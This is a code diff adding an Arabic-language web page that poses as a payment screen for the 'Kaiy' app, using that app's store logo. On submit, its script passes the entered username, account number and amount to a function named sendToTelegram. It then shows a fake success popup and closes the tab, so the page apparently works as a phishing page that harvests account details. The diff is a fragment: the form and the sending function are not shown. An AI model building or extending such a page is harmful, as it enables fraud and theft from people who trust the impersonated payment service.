@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دفع عبر تطبيق كي</title>
+    <style>
+        /* كل أنماط CSS السابقة تبقى كما هي */
+        /* نضيف فقط الأنماط الخاصة بالشعار المنبثق */
+        
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup-content {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            width: 80%;
+            max-width: 400px;
+            animation: popupFadeIn 0.5s;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+        }
+        
+        .popup-logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            border-radius: 20px;
+            border: 3px solid #4CAF50;
+            padding: 10px;
+            background: white;
+        }
+        
+        .popup-title {
+            color: #4CAF50;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+        
+        .popup-message {
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .popup-button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .popup-button:hover {
+            background: #45a049;
+        }
+        
+        @keyframes popupFadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <!-- كل محتوى HTML السابق يبقى كما هو -->
+    <!-- نضيف فقط قسم الشعار المنبثق قبل نهاية body -->
+
+    <!-- شعار منبثق جديد -->
+    <div id="successPopup" class="popup-overlay">
+        <div class="popup-content">
+            <img src="https://play-lh.googleusercontent.com/5yK2h1uLql0JRMmU0hBZnN5yNnqd6k4sxJ1BdPR3wXKcJjlxgR0yW0m5p7X5y9Q5Q=s180-rw" alt="شعار كي" class="popup-logo">
+            <h2 class="popup-title">تمت العملية بنجاح!</h2>
+            <p class="popup-message">شكراً لك على استخدام خدمتنا. سيتم إغلاق هذه الصفحة تلقائياً خلال 5 ثوانٍ.</p>
+            <button class="popup-button" onclick="closePage()">إغلاق الآن</button>
+        </div>
+    </div>
+
+    <script>
+        // كل الدوال السابقة تبقى كما هي
+        // نعدل فقط دوال الشعار المنبثق وإغلاق الصفحة
+        
+        function submitPayment() {
+            const amount = document.getElementById('amount').value;
+            const username = document.getElementById('username').value;
+            const accountNumber = document.getElementById('accountNumber').value;
+            
+            if (!username || !accountNumber) {
+                alert('الرجاء إدخال جميع المعلومات المطلوبة');
+                return;
+            }
+            
+            sendToTelegram(amount, username, accountNumber);
+            showSuccessPopup();
+            
+            document.getElementById('amount').value = '';
+            document.getElementById('username').value = '';
+            document.getElementById('accountNumber').value = '';
+            
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step1').classList.add('active');
+            document.querySelectorAll('.step-circle')[1].classList.remove('active');
+        }
+        
+        // وظائف جديدة للشعار المنبثق وإغلاق الصفحة
+        function showSuccessPopup() {
+            const popup = document.getElementById('successPopup');
+            popup.style.display = 'flex';
+            
+            // إغلاق الصفحة تلقائياً بعد 5 ثواني
+            setTimeout(() => {
+                closePage();
+            }, 5000);
+        }
+        
+        function closePage() {
+            // يمكن استخدام إحدى الطريقتين التاليتين:
+            
+            // الطريقة 1: إغلاق النافذة/التبويب (تعمل إذا تم فتح الصفحة بنافذة جديدة)
+            window.close();
+            
+            // الطريقة 2: إعادة التوجيه إلى صفحة أخرى (إذا لم تعمل الطريقة الأولى)
+            // window.location.href = "https://example.com/thank-you.html";
+            
+            // الطريقة 3: إخفاء كل المحتوى وإظهار رسالة شكر
+            /*
+            document.body.innerHTML = `
+                <div style="text-align:center; padding:50px; font-family:Arial;">
+                    <h1 style="color:#4CAF50;">شكراً لك!</h1>
+                    <p>تم إتمام عملية الدفع بنجاح.</p>
+                    <p>يمكنك إغلاق هذه الصفحة الآن.</p>
+                </div>
+            `;
+            */
+        }
+    </script>
+</body>
+</html>
